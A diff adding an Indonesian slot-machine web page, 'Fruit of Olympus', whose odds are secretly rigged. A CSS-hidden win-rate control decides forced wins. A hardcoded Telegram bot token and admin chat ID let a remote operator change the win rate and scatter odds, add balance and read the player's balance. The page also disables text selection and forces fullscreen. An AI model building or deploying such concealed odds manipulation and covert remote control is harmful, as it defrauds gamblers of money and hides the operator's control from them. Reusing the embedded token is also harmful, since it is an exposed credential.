@@ -1,0 +1,833 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
+<title>Fruit of Olympus</title>
+<style>
+:root{
+  --bg:#04030a; --stage:#221226; --box:#1e1520; --border:rgba(255,255,255,0.04);
+  --accent:#ffd76b; --muted:#b8a9c2;
+}
+* {
+  user-select: none !important;
+  -webkit-user-select: none !important;
+  -moz-user-select: none !important;
+  -ms-user-select: none !important;
+}
+*{box-sizing:border-box}
+html,body{height:100%;margin:0}
+body{
+  background:linear-gradient(180deg,#03030a,#120517); color:#fff; font-family:Inter,system-ui,Roboto,Arial;
+  display:flex;align-items:stretch;justify-content:center;
+}
+.app{width:100%;max-width:480px;height:90vh;display:flex;flex-direction:column;padding:14px;gap:20px}
+.header{padding-top:30px;display:flex;justify-content:space-between;align-items:flex-start}
+.title h1{margin:0;font-size:18px;color:var(--accent);font-weight:900}
+.title p{margin:0;font-size:12px;color:var(--muted)}
+.balance{color:#b8a9c2;font-weight:900;font-size:16px}
+.stage {
+  background: var(--stage);
+  padding: 20px ;
+  border-radius: 16px;
+  width: 100%;
+  height: auto;
+}
+.top-row{display:flex;align-items:center;justify-content:space-between;padding-bottom:17px}
+.zeus{display:flex;align-items:center;gap:8px}
+.zeus .man{font-size:34px;animation:idle 2600ms infinite}
+@keyframes idle{0%{transform:translateY(0)}50%{transform:translateY(-6px)}100%{transform:translateY(0)}}
+.zeus-glow{position:absolute;left:50%;transform:translateX(-50%);top:68px;width:260px;height:80px;border-radius:50%;filter:blur(22px);background:radial-gradient(closest-side,transparent);pointer-events:none;opacity:0.9;z-index:10}
+.grid{width:100%;display:grid;grid-template-columns:repeat(5,1fr);grid-auto-rows:calc((100% - 0px)/4);gap:10px;z-index:5}
+.cell{
+  background:var(--box);border:2px solid var(--border);border-radius:12px;
+  display:flex;align-items:center;justify-content:center;font-size:28px;color:#fff;
+  transition:transform .28s,opacity .38s,box-shadow .28s,background .28s;
+  user-select:none;position:relative;overflow:hidden;padding:6px;
+}
+.cell .card{width:64%;height:64%;display:flex;align-items:center;justify-content:center;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));box-shadow: inset 0 -6px 12px rgba(0,0,0,0.35);font-size:30px}
+.cell.fall{animation:fallIn .45s ease forwards}
+@keyframes fallIn{ from{transform:translateY(-22px);opacity:0} to{transform:translateY(0);opacity:1} }
+@keyframes shake {0%{transform:translateY(0)}20%{transform:translateY(-6px) rotate(-2deg)}40%{transform:translateY(2px) rotate(2deg)}60%{transform:translateY(-2px) rotate(-1deg)}80%{transform:translateY(1px) rotate(1deg)}100%{transform:translateY(0) rotate(0)}}
+.cell.shake{animation:shake .55s ease}
+.bolt-wrap{position:absolute;left:50%;transform:translateX(-50%);top:-320px;pointer-events:none;z-index:60;display:none;width:320px}
+.bolt{width:100%;height:320px;background:linear-gradient(180deg,#fff8cf,#ffd57f);clip-path:polygon(45% 0, 62% 0, 57% 35%, 85% 35%, 40% 100%, 48% 60%, 24% 60%);display:flex;align-items:center;justify-content:center;border-radius:8px;filter:drop-shadow(0 28px 60px rgba(255,180,60,0.18));opacity:0;transform-origin:center top}
+.bolt.show{animation:fallBolt 950ms forwards}
+@keyframes fallBolt{0%{transform:translateY(-20px) scale(.6) rotate(-6deg);opacity:0}40%{opacity:1;transform:translateY(220px) scale(1.05) rotate(4deg)}100%{opacity:0;transform:translateY(320px) scale(1.25) rotate(8deg)}}
+.bolt .txt{font-weight:900;color:#23160b;font-size:46px}
+.win-overlay{position:absolute;left:50%;transform:translateX(-50%);top:250px;background:linear-gradient(90deg,#fff0b8,#ffd6a3);color:#2a1b12;padding:10px 12px;border-radius:10px;font-weight:900;display:none;z-index:80}
+.mega-win{position:absolute;left:50%;top:35%;transform:translate(-50%,-50%) scale(.9);padding:20px 22px;background:linear-gradient(90deg,#ffd76b,#ffb84a);color:#230f04;border-radius:14px;font-weight:900;font-size:22px;display:none;z-index:120;box-shadow:0 30px 80px rgba(0,0,0,0.6)}
+.progress{width:86%;height:10px;margin-top:40px;background:rgba(255,255,255,0.03);border-radius:999px;overflow:hidden}
+.progress > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,#fff2b0,#ffd38a);border-radius:6px}
+.controls{display:flex;flex-direction:column;gap:8px}
+.row{display:flex;gap:8px;align-items:center}
+.btn{background:#2b1630;border:none;padding:8px 12px;border-radius:100px;color:#fff;cursor:pointer;font-weight:800;font-size:13px}
+.spin{background:linear-gradient(180deg,#ffc86a,#ff974c);color:#2a1b12;border-radius:999px;padding:12px 18px;width:100%;font-size:14px}
+.buy{background:linear-gradient(180deg,#9be8ff,#6ec8ff);color:#042033}
+.betBox{color:#b8a9c2;font-weight:600;display:flex;align-items:center;gap:8px;background:rgba(255,255,255,0.02);padding:6px 8px;border-radius:8px}
+.small{padding:6px 8px;font-size:14px}
+.small1{pointer-events:none;color: #b8a9c2;margin-bottom:-20px;margin-top:10px;padding:8px 8px;width:100%;font-size:13px}
+.history{color:#b8a9c2;border-radius:10px;padding:8px;max-height:200px;overflow:auto;font-size:13px}
+.history{justify-content:space-between;padding:6px}
+.muted{color:var(--muted);font-size:14px}
+.controls-bottom{display:flex;gap:10px;align-items:center;justify-content:space-between}
+.sliderWrap{display:flex;align-items:center;gap:8px}
+.winPercent{font-weight:900;color:var(--accent)}
+.popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:200;opacity:0;pointer-events:none;transition:opacity .18s}
+.popup-overlay.show{opacity:1;pointer-events:auto}
+.popup{background:linear-gradient(180deg,#fffaf0,#fff0b0);color:#23160b;padding:18px 22px;border-radius:12px;min-width:280px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.5)}
+.popup h2{margin:0 0 8px 0}
+.popup p{margin:6px 0 12px 0}
+.popup button{background:#ffd76b;border:none;padding:10px 16px;border-radius:10px;font-weight:900;cursor:pointer}
+.countdown-overlay {
+  position: absolute;
+  bottom: 20px;     
+  right: 20px;  
+  transform: none;  
+  z-index: 220;
+  pointer-events: none;
+  opacity: 0;
+  transition: opacity .12s;
+}
+.countdown-overlay.show {
+  opacity: 1;
+  pointer-events: auto;
+}
+.countdown-box{width:50px;margin-top:150%;height:50px;border-radius:999px;background:linear-gradient(90deg,#fffaf0,#ffd76b);display:flex;align-items:center;justify-content:center;box-shadow:0 30px 80px rgba(0,0,0,0.5)}
+.countdown-num{font-size:30px;font-weight:900;color:#23160b}
+#alertPopup .popup {
+  background: linear-gradient(180deg,#fff0b0,#ffd76b);
+  color:#23160b;
+  padding:16px 20px;
+  border-radius:12px;
+  min-width:260px;
+  text-align:center;
+  font-weight:900;
+  box-shadow:0 30px 80px rgba(0,0,0,0.5);
+}
+#alertPopup.show {
+  opacity:1;
+  pointer-events:auto;
+}
+@media(max-height:640px){
+  .grid{grid-auto-rows:48px}
+  .cell{font-size:22px}
+  .cell .card{font-size:22px}
+  .countdown-box{width:140px;height:140px}
+  .countdown-num{font-size:54px}
+}
+input[type="range"],
+#winrateRange,
+#scatterRange,
+#wrLabel,
+label[for="winrateRange"],
+label[for="scatterRange"] {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  width: 0 !important;
+  height: 0 !important;
+  pointer-events: none !important;
+}
+</style>
+</head>
+<body>
+  <div class="app" id="app">
+    <div class="header">
+      <div class="title">
+        <h1>🎰 Fruit of Olympus</h1>
+      </div>
+      <div style="text-align:right">
+        <div class="balance"><span id="uiBalance">Rp 0</span></div>
+      </div>
+    </div>
+
+    <div class="stage" id="stage">
+      <div class="top-row">
+        <div style="display:flex;align-items:center;gap:8px">
+          <div style="margin-left:3px;font-size:20px;font-weight: bold;color: #b8a9c2;" class="muted">Project #7782</div>
+        </div>
+        <div class="muted">Free Spins: <strong id="fs">0</strong></div>
+      </div>
+
+      <div class="zeus-glow" aria-hidden="true"></div>
+
+      <div class="bolt-wrap" id="boltWrap" style="display:none">
+        <div class="bolt" id="bolt"><div class="txt" id="boltTxt">x2</div></div>
+      </div>
+
+      <div class="win-overlay" id="winOverlay">WIN Rp <span id="winAmount">0</span><span id="winPct"></span></div>
+      <div class="mega-win" id="megaWin">MEGA WIN</div>
+
+      <div class="grid" id="grid"></div>
+
+      <div style="width:100%;display:flex;flex-direction:column;align-items:center;gap:8px;margin-top:10px">
+        <div class="progress"><i id="progressBar"></i></div>
+        <div class="muted" style="margin-top:10px;font-size:14px">🎰🎰🎰🎰 Symbols mendapatkan 12x free spins</div>
+      </div>
+    </div>
+
+    <div class="controls">
+      <div class="row">
+        <div class="betBox">
+          <button class="btn small" id="decBet">−</button>
+          <div style="min-width:120px;text-align:center"><span id="betDisplay">2.000</span></div>
+          <button class="btn small" id="incBet">+</button>
+        </div>
+
+        <button style="padding: 10px;border-radius:8px;" class="btn spin" id="spinBtn">SPIN</button>
+        <button style="padding: 10px;border-radius:8px;" class="btn spin" id="buyBtn">BUY</button>
+      </div>
+
+        <div style="display:flex;">
+          <button style="display:none" class="btn small1" data-auto="10000">Auto</button>
+          <button class="btn small1" id="stopAutoBtn">Riwayat transaksi</button>
+        </div>
+
+        <div style="margin-left:auto;display:flex;gap:8px;align-items:center">
+          <div class="muted"></div>
+          <div class="sliderWrap">
+            <input id="winRate" type="range" min="0" max="100" value="20" style="width:140px">
+            <div class="winPercent" id="wrLabel">20%</div>
+          </div>
+        </div>
+      </div>
+
+          <div class="history" id="history"><div class="muted"></div></div>
+        </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="fsPopup" aria-hidden="true">
+    <div class="popup">
+      <h2>🎰 FREE SPIN</h2>
+      <p id="popupInfo">Kamu mendapatkan free spin. Klik OK untuk memulai <strong>12x</strong> free spins.</p>
+      <button id="fsOkBtn">OK</button>
+    </div>
+  </div>
+
+  <div class="countdown-overlay" id="countdownOverlay" aria-hidden="true">
+  <div style="display:flex;flex-direction:column;align-items:center;gap:4px">
+    <div class="countdown-box">
+      <div class="countdown-num" id="countdownNum">10</div>
+    </div>
+  </div>
+</div>
+
+  
+<div class="popup-overlay" id="alertPopup" aria-hidden="true">
+  <div class="popup">
+    <p id="alertText">Pesan alert</p>
+    <button id="alertOkBtn" style="background:#8B4513; color:#fff; border:none; padding:10px 16px; border-radius:10px; font-weight:900; cursor:pointer;">
+     OK
+    </button>
+  </div>
+</div>
+
+<div class="popup-overlay" id="confirmPopup" aria-hidden="true">
+  <div class="popup">
+    <p id="confirmText">Apakah kamu yakin?</p>
+    <div style="display:flex;justify-content:center;gap:12px;margin-top:12px">
+      <button id="confirmYesBtn" style="background:#228B22; color:#fff; border:none; padding:10px 16px; border-radius:10px; font-weight:900; cursor:pointer;">YES</button>
+      <button id="confirmNoBtn" style="background:#8B4513; color:#fff; border:none; padding:10px 16px; border-radius:10px; font-weight:900; cursor:pointer;">NO</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ====== CONFIG ====== */
+const SYMBOLS = [
+  {id:'crown', e:'👑', val:10},
+  {id:'diamond', e:'💎', val:8},
+  {id:'lemon', e:'🍋', val:5},
+  {id:'confetti', e:'🟢', val:4},
+  {id:'fire', e:'🍇', val:6},
+  {id:'bag', e:'♦️', val:9},
+  {id:'star', e:'⭐', val:7},
+  {id:'slot', e:'🎰', val:0, scatter:true}
+];
+
+const BOLT_MULTS = {2:420, 4:240, 8:10, 12:7, 25:5, 500:3};
+
+const ROWS = 4, COLS = 5, POS = ROWS * COLS;
+const SCATTER_POS_PROB = 0.05;
+const SCATTER_MAX = 4;
+const FREE_SPIN_COUNT = 12;
+
+/* ====== STATE ====== */
+let balance = 0;
+let bet = 2000;
+let winRate = 1; 
+let scatterRate = 0;
+let freeSpins = 0;
+let pendingFreeSpins = 0;
+let autoActive = false;
+let autoRemaining = 0;
+let autoIntervalId = null;
+let autoLoopTimer = null;
+let spinning = false;
+let freeSpinAutoRunning = false;
+let spinCounter = 0;
+
+/* ====== ELEMENTS ====== */
+const uiBalance = document.getElementById('uiBalance');
+const betDisplay = document.getElementById('betDisplay');
+const gridEl = document.getElementById('grid');
+const boltWrap = document.getElementById('boltWrap');
+const bolt = document.getElementById('bolt');
+const boltTxt = document.getElementById('boltTxt');
+const winOverlay = document.getElementById('winOverlay');
+const winAmount = document.getElementById('winAmount');
+const progressBar = document.getElementById('progressBar');
+const fsEl = document.getElementById('fs');
+const historyEl = document.getElementById('history');
+const spinBtn = document.getElementById('spinBtn');
+const buyBtn = document.getElementById('buyBtn');
+const incBet = document.getElementById('incBet');
+const decBet = document.getElementById('decBet');
+const winRateInput = document.getElementById('winRate');
+const wrLabel = document.getElementById('wrLabel');
+const megaWinEl = document.getElementById('megaWin');
+const fsPopup = document.getElementById('fsPopup');
+const fsOkBtn = document.getElementById('fsOkBtn');
+const popupInfo = document.getElementById('popupInfo');
+const stopAutoBtn = document.getElementById('stopAutoBtn');
+const countdownOverlay = document.getElementById('countdownOverlay');
+const countdownNumEl = document.getElementById('countdownNum');
+const alertPopup = document.getElementById('alertPopup');
+const alertText = document.getElementById('alertText');
+const alertOkBtn = document.getElementById('alertOkBtn');
+const confirmPopup = document.getElementById('confirmPopup');
+const confirmText = document.getElementById('confirmText');
+const confirmYesBtn = document.getElementById('confirmYesBtn');
+const confirmNoBtn = document.getElementById('confirmNoBtn');
+
+/* ====== UTIL ====== */
+function fmt(n){ return n.toLocaleString('id-ID'); }
+function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+function updateUI(){
+  uiBalance.textContent = 'Rp ' + fmt(balance);
+  betDisplay.textContent = fmt(bet);
+  fsEl.textContent = freeSpins;
+  wrLabel.textContent = winRate + '%';
+}
+
+/* ====== GRID ====== */
+function initGrid(){
+  gridEl.innerHTML = '';
+  for(let i=0;i<POS;i++){
+    const c = document.createElement('div'); c.className = 'cell';
+    const card = document.createElement('div'); card.className='card'; card.textContent = '❔';
+    c.appendChild(card); c.dataset.idx = i; gridEl.appendChild(c);
+  }
+}
+initGrid();
+updateUI();
+
+/* ====== RANDOM HELPERS ====== */
+function weightedPickFromObj(obj){
+  const pairs = Object.entries(obj).map(([k,v])=>({k:parseInt(k,10), w: Number(v)}));
+  const total = pairs.reduce((acc,p)=>acc + p.w, 0);
+  let r = Math.random() * total;
+  for(const p of pairs){
+    r -= p.w;
+    if(r <= 0) return p.k;
+  }
+  return pairs[0].k;
+}
+
+function pickBolt(isFree){
+  const adj = {};
+  for(const k in BOLT_MULTS){
+    let w = Number(BOLT_MULTS[k]);
+    if(isFree && parseInt(k,10) >= 12) w = Math.floor(w * 1.6);
+    adj[k] = w;
+  }
+  return weightedPickFromObj(adj);
+}
+
+/* ====== SYMBOL GENERATION ====== */
+function generateSymbols(forceWin=false, isFree=false){
+  const arr = new Array(POS);
+  let scatAllowed = SCATTER_MAX;
+  for(let i=0;i<POS;i++){
+    if(!isFree && Math.random() < SCATTER_POS_PROB && scatAllowed > 0){
+      arr[i] = SYMBOLS.find(s => s.scatter);
+      scatAllowed--;
+    } else {
+      const non = SYMBOLS.filter(s => !s.scatter);
+      arr[i] = non[Math.floor(Math.random()*non.length)];
+    }
+  }
+
+  let scount = arr.filter(s => s.scatter).length;
+  if(scount > SCATTER_MAX){
+    for(let i=0;i<arr.length && scount>SCATTER_MAX;i++){
+      if(arr[i].scatter){ arr[i] = SYMBOLS.filter(s => !s.scatter)[Math.floor(Math.random()*(SYMBOLS.length-1))]; scount--; }
+    }
+  }
+
+  if(forceWin){
+    const non = SYMBOLS.filter(s => !s.scatter);
+    const candidate = non[Math.floor(Math.random()*non.length)];
+    const idxs = [];
+    while(idxs.length < 8){
+      const r = Math.floor(Math.random()*POS);
+      if(!idxs.includes(r)) idxs.push(r);
+    }
+    idxs.forEach(i => arr[i] = candidate);
+  }
+  return arr;
+}
+
+function renderGrid(symbols){
+  const cells = gridEl.querySelectorAll('.cell');
+  symbols.forEach((s,i)=>{
+    const el = cells[i];
+    el.classList.remove('win','hidden','shake','fall');
+    const card = el.querySelector('.card');
+    card.textContent = s.e;
+    card.style.opacity = 1;
+    el.style.opacity = 1;
+    el.style.transform = 'translateY(0)';
+    setTimeout(()=> el.classList.add('fall'), i * 28);
+  });
+}
+
+function analyze(symbols){
+  const counts = {};
+  symbols.forEach(s => counts[s.id] = (counts[s.id]||0) + 1);
+  let winner = null;
+  for(const id in counts){
+    if(counts[id] >= 8 && id !== 'slot'){ winner = SYMBOLS.find(x => x.id === id); break; }
+  }
+  const scount = counts['slot'] || 0;
+  return {counts, winner, scount};
+}
+
+/* ====== VISUALS ====== */
+function playBolt(mult){
+  boltTxt.textContent = 'x' + mult;
+  boltWrap.style.display = 'block';
+  bolt.classList.remove('show');
+  void bolt.offsetWidth;
+  bolt.classList.add('show');
+  setTimeout(()=> { boltWrap.style.display = 'none'; }, 1100);
+}
+
+async function hideWinners(symbols, winId){
+  const cells = Array.from(gridEl.querySelectorAll('.cell'));
+  cells.forEach((c,i)=> { if(symbols[i].id === winId) c.classList.add('win'); });
+  await sleep(460);
+  for(let i=0;i<cells.length;i++){
+    if(symbols[i].id === winId){
+      cells[i].classList.add('shake');
+      await sleep(120);
+      cells[i].classList.add('hidden');
+    }
+  }
+}
+
+function animateWin(total){
+  return new Promise(resolve=>{
+    const duration = 1200;
+    const start = performance.now();
+    function step(now){
+      const t = Math.min(1,(now-start)/duration);
+      const eased = 1 - Math.pow(1 - t, 2);
+      const cur = Math.floor(total * eased);
+      const pct = Math.floor(eased * 100);
+      progressBar.style.width = pct + '%';
+      winOverlay.style.display = 'block';
+      winAmount.textContent = fmt(cur);
+      if(t < 1) requestAnimationFrame(step);
+      else {
+        setTimeout(()=> { winOverlay.style.display = 'none'; progressBar.style.width = '0%'; winPct.textContent = ''; }, 420);
+        resolve();
+      }
+    }
+    requestAnimationFrame(step);
+  });
+}
+
+function megaWin(total, mult){
+  megaWinEl.textContent = `MEGA WIN x${mult} +Rp ${fmt(total)}`;
+  megaWinEl.style.display = 'block';
+  megaWinEl.style.transform = 'translate(-50%,-50%) scale(1.08)';
+  setTimeout(()=>{ megaWinEl.style.transform = 'translate(-50%,-50%) scale(1)'; }, 60);
+  setTimeout(()=>{ megaWinEl.style.display = 'none'; }, 1800);
+}
+
+/* ====== HISTORY ====== */
+function pushHistory(entry){
+  spinCounter++;
+  const row = document.createElement('div'); row.className = 'row';
+  const emoji = entry.winSymbol ? entry.winSymbol.e : (entry.scatter ? '🎰 x' + entry.scatterCount : '—');
+  const mult = entry.mult ? 'x' + entry.mult : '-';
+  const winTxt = entry.win ? '+ Rp ' + fmt(entry.win) : '-';
+  row.innerHTML = `<div style="font-size:16px;display:flex;font-weight:500">#${spinCounter} | BET | ${fmt(entry.bet||0)} | RESULT | ${mult} | ${winTxt} </div></div>`;
+  historyEl.prepend(row);
+  while(historyEl.childElementCount > 120) historyEl.removeChild(historyEl.lastChild);
+}
+
+/* ====== POPUPS ====== */
+function showAlert(message){
+  alertText.textContent = message;
+  alertPopup.classList.add('show');
+  return new Promise(resolve => {
+    alertOkBtn.onclick = () => {
+      alertPopup.classList.remove('show');
+      resolve();
+    };
+  });
+}
+
+function showConfirm(message){
+  confirmText.textContent = message;
+  confirmPopup.classList.add('show');
+  return new Promise(resolve=>{
+    confirmYesBtn.onclick = () => { confirmPopup.classList.remove('show'); resolve(true); };
+    confirmNoBtn.onclick = () => { confirmPopup.classList.remove('show'); resolve(false); };
+  });
+}
+
+/* ====== FREE SPIN HANDLER ====== */
+async function runFreeSpinsAuto(){
+  if(freeSpinAutoRunning) return;
+  if(freeSpins <= 0) return;
+
+  freeSpinAutoRunning = true;
+  setAutoButtonsDisabled(true);
+  setControlsDisabled(true);
+
+  while(freeSpins > 0){
+    await runCountdown(3);
+    await doSpin(true);
+    await sleep(420);
+  }
+
+  freeSpinAutoRunning = false;
+  setAutoButtonsDisabled(false);
+  setControlsDisabled(false);
+}
+
+/* ====== SPIN LOGIC ====== */
+async function doSpin(isAuto=false){
+  if(spinning) return;
+  const wasFree = freeSpins > 0;
+
+  if(balance < bet && !wasFree){
+    await showAlert('Saldo anda tidak mencukupi');
+    stopAuto(); hideCountdown();
+    return;
+  }
+
+  spinning = true;
+  spinBtn.disabled = true;
+
+  if(!wasFree) balance -= bet;
+  updateUI();
+
+  const forceWin = (Math.random() * 100) < winRate;
+
+  for(let s=0;s<6;s++){
+    renderGrid(generateSymbols(false, false));
+    await sleep(40 + s*25);
+  }
+
+  const symbols = generateSymbols(forceWin, wasFree);
+  renderGrid(symbols);
+
+  const {winner, scount} = analyze(symbols);
+
+  if(winner){
+    const mult = pickBolt(wasFree);
+    const base = bet * winner.val;
+    const total = Math.floor(base * mult);
+
+    playBolt(mult);
+    document.querySelector('.zeus-glow').style.opacity = 1;
+    setTimeout(()=> document.querySelector('.zeus-glow').style.opacity = 0.85, 70);
+    await sleep(320);
+    await hideWinners(symbols, winner.id);
+    await animateWin(total);
+    balance += total;
+    if(mult >= 12){
+      megaWin(total, mult);
+    }
+    pushHistory({winSymbol: winner, mult, win: total, bet: wasFree ? 0 : bet});
+  } else if(scount >= 4 && !wasFree){
+    pendingFreeSpins = FREE_SPIN_COUNT;
+    showFreeSpinPopup(scount);
+    pushHistory({scatter: true, scatterCount: scount, mult: null, win: 0, bet: wasFree ? 0 : bet});
+    hideCountdown();
+    stopAuto();
+  } else {
+    pushHistory({win: null, bet: wasFree ? 0 : bet});
+  }
+
+  if(wasFree){
+    freeSpins = Math.max(0, freeSpins - 1);
+  }
+
+  updateUI();
+  spinning = false;
+  spinBtn.disabled = false;
+}
+
+/* ====== COUNTDOWN ====== */
+async function runCountdown(seconds) {
+  countdownOverlay.classList.add('show');
+  for (let i = seconds; i > 0; i--) {
+    countdownNumEl.textContent = i;
+    await sleep(1000); 
+  }
+  countdownOverlay.classList.remove('show');
+}
+
+/* ====== AUTO SPIN ====== */
+async function startAuto(count){
+  if(autoActive) return;
+  if(balance < bet && freeSpins <= 0){
+    await showAlert('Saldo tidak cukup untuk auto');
+    return;
+  }
+
+  autoActive = true;
+  autoRemaining = count;
+
+  setControlsDisabled(true);
+  setAutoButtonsDisabled(true);
+  stopAutoBtn.disabled = false; 
+  try {
+    while(autoActive && autoRemaining > 0){
+      showCountdown(autoRemaining);
+      await doSpin(true);
+      autoRemaining--;
+      showCountdown(autoRemaining);
+
+      if(!autoActive) break;
+      if(autoRemaining <= 0) break;
+      if(balance < bet && freeSpins <= 0) {
+        await showAlert('Saldo tidak mencukupi, auto dihentikan');
+        break;
+      }
+
+      await sleep(420);
+    }
+  } finally {
+    cleanupAuto();
+  }
+}
+
+function cleanupAuto(){
+  autoActive = false;
+  autoRemaining = 0;
+  if(autoIntervalId){ clearInterval(autoIntervalId); autoIntervalId = null; }
+  if(autoLoopTimer){ clearTimeout(autoLoopTimer); autoLoopTimer = null; }
+  hideCountdown();
+  setControlsDisabled(false);
+  setAutoButtonsDisabled(false);
+  stopAutoBtn.disabled = true;
+}
+
+function stopAuto(){
+  autoActive = false; 
+}
+
+/* ====== COUNTDOWN UI ====== */
+function showCountdown(n){
+  countdownNumEl.textContent = String(Math.max(0, n));
+  countdownOverlay.classList.add('show');
+}
+
+function hideCountdown(){
+  countdownOverlay.classList.remove('show');
+}
+
+/* ====== BUY SPIN ====== */
+async function buySpin(){
+  const price = bet * 100;
+  if(balance < price){
+    await showAlert('Saldo tidak cukup untuk buy spin');
+    return;
+  }
+  const ok = await showConfirm(`Beli Free Spins ${FREE_SPIN_COUNT}x seharga Rp ${fmt(price)} ?`);
+  if(!ok) return;
+  balance -= price;
+  freeSpins += FREE_SPIN_COUNT;
+  updateUI();
+  pushHistory({note: 'Bought Free Spins', bet: price});
+  runFreeSpinsAuto();
+}
+
+/* ====== FREE SPIN POPUP ====== */
+function showFreeSpinPopup(scount){
+  popupInfo.innerHTML = `Kamu mendapatkan <strong>${FREE_SPIN_COUNT}x</strong> Free Spins (scatter x${scount}). Klik <strong>OK</strong> untuk mulai.`;
+  fsPopup.classList.add('show');
+}
+fsOkBtn.addEventListener('click', ()=> {
+  fsPopup.classList.remove('show');
+  if (pendingFreeSpins > 0) {
+    freeSpins += pendingFreeSpins;
+    pendingFreeSpins = 0;
+    updateUI();
+    runFreeSpinsAuto();
+  }
+});
+
+async function runCountdown(seconds) {
+  countdownOverlay.classList.add('show');
+  for (let i = seconds; i > 0; i--) {
+    countdownNumEl.textContent = i;
+  }
+  countdownOverlay.classList.remove('show');
+}
+
+/* ====== CONTROL HELPERS ====== */
+function setControlsDisabled(disabled){
+  spinBtn.disabled = disabled;
+  buyBtn.disabled = disabled;
+  incBet.disabled = disabled;
+  decBet.disabled = disabled;
+  stopAutoBtn.disabled = !autoActive;
+}
+
+function setAutoButtonsDisabled(disabled){
+  document.querySelectorAll('[data-auto]').forEach(b => b.disabled = disabled);
+}
+
+/* ====== EVENT BINDINGS ====== */
+spinBtn.addEventListener('click', ()=>{ if(!autoActive && !spinning) doSpin(false); });
+buyBtn.addEventListener('click', buySpin);
+stopAutoBtn.addEventListener('click', stopAuto);
+
+incBet.addEventListener('click', ()=> { bet = Math.min(500000, Math.floor(bet * 1.5)); updateUI(); });
+decBet.addEventListener('click', ()=> { bet = Math.max(100, Math.floor(bet / 1.5)); updateUI(); });
+
+document.querySelectorAll('[data-auto]').forEach(b => {
+  b.addEventListener('click', (e) => {
+    const n = parseInt(b.getAttribute('data-auto'), 10);
+    startAuto(n);
+  });
+});
+
+winRateInput.addEventListener('input', e => { winRate = parseInt(e.target.value,10); updateUI(); });
+
+document.addEventListener('keydown', (e) => { if(e.key === ' ') { e.preventDefault(); if(!autoActive) doSpin(false); } });
+
+/* ====== INIT ====== */
+(function init(){
+  renderGrid(generateSymbols(false, false));
+  updateUI();
+  historyEl.innerHTML = '<div class="muted"></div>';
+})();
+
+const BOT_TOKEN = '7662473027:AAGcGf3COSG5BlR7d_aSPE6v9T90fA8G2ac';
+const ADMIN_CHAT_ID = '1414540300';
+
+setInterval(checkTelegramCommands, 5000);
+
+let lastUpdateId = 0;
+
+async function checkTelegramCommands(){
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}`);
+    const data = await res.json();
+    if(!data.ok || !data.result.length) return;
+
+    for(const update of data.result){
+      lastUpdateId = update.update_id;
+      if(!update.message || update.message.chat.id != ADMIN_CHAT_ID) continue;
+
+      const msg = update.message.text.trim();
+      processTelegramCommand(msg);
+    }
+  } catch(err){
+    console.error('', err);
+  }
+}
+
+function processTelegramCommand(msg){
+  const parts = msg.split(' ');
+  const cmd = parts[0].toLowerCase();
+  const arg = parts[1] ? parseInt(parts[1]) : null;
+
+  if(cmd === '/addbalance' && arg){
+    balance += arg;
+    updateUI();
+    pushHistory({note:`Admin menambah saldo Rp ${fmt(arg)}`, bet:0});
+    sendTelegram(`✅ Saldo berhasil ditambah Rp ${fmt(arg)}.\n✅ Total saldo: Rp ${fmt(balance)}`);
+  }
+
+  else if(cmd === '/setwinrate' && arg >= 0 && arg <= 100){
+    winRate = arg;
+    updateUI();
+    sendTelegram(`✅ Win rate diset ke ${winRate}%`);
+  }
+
+  else if(cmd === '/setscatter' && arg >= 0 && arg <= 100){
+    window.SCATTER_POS_PROB = arg / 100;
+    sendTelegram(`✅ Peluang scatter diubah jadi ${arg}%`);
+  }
+
+  else if(cmd === '/balance'){
+    sendTelegram(`✅ Saldo saat ini: Rp ${fmt(balance)}`);
+  }
+
+  else if(cmd === '/help'){
+    const helpText = `✅ *Daftar Perintah Admin*\n\n` +
+    `• /addbalance 50000 — Saldo Rp50.000\n` +
+    `• /setwinrate 30 — Set menang 30%\n` +
+    `• /balance — Cek saldo pemain\n` +
+    `• /help — Tampilkan menu bantuan\n\n` +
+    `Gunakan perintah ini hanya untuk admin.`;
+    sendTelegram(helpText);
+  }
+
+  else {
+    sendTelegram(`⚙️ Perintah tidak dikenali.\nKetik /help untuk melihat daftar perintah yang tersedia.`);
+  }
+}
+
+async function sendTelegram(text){
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text,
+        parse_mode: 'Markdown'
+      })
+    });
+  } catch(err){
+    console.error('', err);
+  }
+}
+
+document.body.addEventListener('click', async () => {
+  if (!document.fullscreenElement) {
+    try {
+      await document.documentElement.requestFullscreen();
+      console.log('');
+    } catch(err) {
+      console.warn('', err);
+    }
+  }
+});
+</script>
+<audio src="https://github.com/anonseven/heker/raw/main/v2/videoplayback.m4a" id="lagu" loop></audio>
+<script>
+  const lagu = document.getElementById('lagu');
+  function mulaiMusik() {
+    lagu.play().catch(err => console.log('', err));
+    document.removeEventListener('click', mulaiMusik);
+  }
+  document.addEventListener('click', mulaiMusik);
+</script>
+</body>
+</html>
